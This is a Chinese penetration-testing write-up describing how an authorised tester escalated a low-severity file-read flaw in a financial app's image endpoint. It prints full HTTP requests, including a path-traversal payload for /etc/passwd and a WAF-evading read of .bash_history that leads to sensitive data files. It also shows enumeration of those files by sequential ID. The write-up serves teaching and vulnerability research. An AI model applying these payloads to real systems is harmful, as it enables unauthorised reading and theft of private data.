在授权测试某金融类APP时，发现一个鸡肋低危文件读取漏洞，尝试将其升级为高危。

PS：本文仅用于技术讨论与分析，严禁用于任何非法用途，违者后果自负。

## 0x00 初步探测

发现首次打开APP时，会向服务器读取文件加载并展示图片。

测试时一定要细心，笔者发现只有首次打开APP时，才会加载图片，后面再打开应该是资源已被记录，就不会向服务器再次进行请求了。

![](https://image.3001.net/images/20201212/1607755373_5fd4666d2e02df47a48da.png)

此加载展示图片的GET请求数据包如下：

    
    
    GET /ixxx/LgonImage.do?XxxxxImageDir=/XXXXX/Pictures&SaveXxxxxImageName=this_is_image.jpg HTTP/1.1
    Host: xxxxx.com
    Connection: close
    User-Agent: Mozilla/5.0
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,en-US;q=0.8
    

![](https://image.3001.net/images/20201212/1607755500_5fd466ecdc52d00cdbff5.png)

拿到这个数据包的第一反应，以往的渗透测试经验告诉我，从这个地方大概路会存在文件读取漏洞。

分析并猜测功能点URI的每个参数的功能。

    
    
    LogonImageDir=/XXXXX/Pictures - 图片所在的目录
    SaveXxxxxImageName=this_is_image.jpg - 目录下的图片名

## 0x01 漏洞测试

既然已经初步探测到了可能存在漏洞的风险点，并且文件读取功能的参数已经搞清楚，下一步就展开读取测试。

首先测试，是否可以进行目录列出，直接将SaveXxxxxImageName参数置空，看看是否可以读取/XXXXX/Pictures目录下的内容：

    
    
    GET /ixxx/LogonImage.do?XxxxxImageDir=/XXXXX/Pictures&SaveXxxxxImageName= HTTP/1.1
    Host: xxxxx.com
    Connection: close
    User-Agent: Mozilla/5.0
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,en-US;q=0.8
    

返回为“空”，失败，说明程序功能点不存在列出目录漏洞：

![](https://image.3001.net/images/20201212/1607755623_5fd4676795afa5f8b2ebb.png)

测试是否可以跳出目录，选用Payload如下：

    
    
    GET /ixxx/LogonImage.do?XxxxxImageDir=/XXXXX/Pictures/../../../../../../etc/&SaveXxxxxImageName=passwd HTTP/1.1
    Host: xxxxx.com
    Connection: close
    User-Agent: Mozilla/5.0
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,en-US;q=0.8

返回某恒防火墙拦截界面，失败：

![](https://image.3001.net/images/20201212/1607755681_5fd467a1a034f3ee2a9fe.png)![](https://image.3001.net/images/20201212/1607755730_5fd467d22ff39991c224f.png)

接下来进一步测试，是/etc/passwd触发的WAF，还是/../触发的WAF。

测试只进行一层目录跳出，并且删除/etc/passwd关键字：

    
    
    GET /ixxx/LogonImage.do?XxxxxImageDir=/XXXXX/Pictures/../&SaveXxxxxImageName= HTTP/1.1
    Host: xxxxx.com
    Connection: close
    User-Agent: Mozilla/5.0
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,en-US;q=0.8

唔...看来/../的特殊字符就已经触发了WAF：

![](https://image.3001.net/images/20201212/1607755834_5fd4683a622ea963cee01.png)

之后想到尝试对数据包进行POST类型转换，使用POST传参的一些方式进行WAF的测试，如：

  * URL编码
  * 分块传输
  * 脏数据填充
  * 包体转换
  * 畸形数据包
  * ......

但是无奈，POST请求直接无法传参，程序限制了GET请求接收参数。

（不过，后来测试其他POST传参的功能时，发现以笔者现有的WAF绕过经验思路，根本无法对某恒的WAF进行绕过.....）

## 0x02 漏洞确认

总结以上对此文件读取漏洞收集到的信息：

  * 目录无法跨越，并且文件读取的路径在当前根目录；
  * 特殊字符串，已被WAF完美防护住；
  * 无法获取目录下的文件名、无法预知是否可以读取其他后缀文件。

测试到这里突然灵光一闪，想到了“.bash_history”，如果网站根目录存在此文件，并且可以读取，上面的疑问就可以直接解决大半了，先来了解一下这些文件作用：

  * .bash_profile：此文件为系统的每个用户设置环境信息，当用户第一次登录时，该文件被执行。
  * .bash_history：该文件保存了当前用户输入过的历史命令；
  * .bash_logout：该文件的用途是用户注销时执行的命令，默认为空；
  * .bashrc：此文件为每一个运行bash shell的用户执行此文件。当bash shell被打开时，该文件被读取。

于是直接对网站根目录进行.bash_profile的盲测：

    
    
    GET /ixxx/LogonImage.do?XxxxxImageDir=/&SaveXxxxxImageName=.bash_profile HTTP/1.1
    Host: xxxxx.com
    Connection: close
    User-Agent: Mozilla/5.0
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,en-US;q=0.8

此payload既避免了跳出目录，又避开了WAF严打的特殊字符，但是唯一遗漏的.bash文件被我们利用到了。

![](https://image.3001.net/images/20201212/1607756185_5fd469990a84d41638814.png)

激动的心颤抖的手，看来当前网站根目录确实是此用户的目录，并且用户在此根目录下执行过命令！

接下来尝试进一步扩大危害。

## 0x03 危害升级

不清楚当前目录结构，就代表着无法定向读取文件，但是还有一个.bash_history我们没有利用到，看看是否可以在其中获取到更重要的信息。

读取根目录下的.bash_history：

  

    
    
    GET /ixxx/LogonImage.do?XxxxxImageDir=/&SaveXxxxxImageName=.bash_history HTTP/1.1
    Host: xxxxx.com
    Connection: close
    User-Agent: Mozilla/5.0
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,en-US;q=0.8

信息量虽然少，但是已经有了新的进展：

![](https://image.3001.net/images/20201212/1607756260_5fd469e41f1612b926dea.png)

由历史命令得知，管理员cd进入了两层目录：/Nxxxx/xxFile/

并且查看了xx_20201022_51xxx.txt文件。

直接构造读取此文件！

    
    
    GET /ixxx/LogonImage.do?XxxxxImageDir=/Nxxxx/xxFile&SaveXxxxxImageName=xx_20201022_51xxx.txt HTTP/1.1
    Host: xxxxx.com
    Connection: close
    User-Agent: Mozilla/5.0
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,en-US;q=0.8

成功读取到了敏感的数据信息：

![](https://image.3001.net/images/20201212/1607756335_5fd46a2f43e1abb091cee.png)

并且文件的ID值为时间戳+ID顺序编号组成，可轻松遍历出全部的信息。

Burpsuite Intruder模块测试：

![](https://image.3001.net/images/20201212/1607756372_5fd46a54ef0a2d8f34857.png)

尝试遍历10个ID值成功。

## 0x04 回首总结

存在的难题：目录无法跨越、WAF盯防、无法预知目录文件结构。

在此情况下，利用Linux文件系统特性，仍然可以将低危漏洞提升至高危。

并且危害的等级高低是无法预估的，这取决于.bash_history会给我们泄露多少信息，所以文件读取漏洞存在时间越久，记录的东西越多，危害越大！

希望这个简单的漏洞挖掘过程，能给大家带来一些挖洞思路~

谢谢大家！

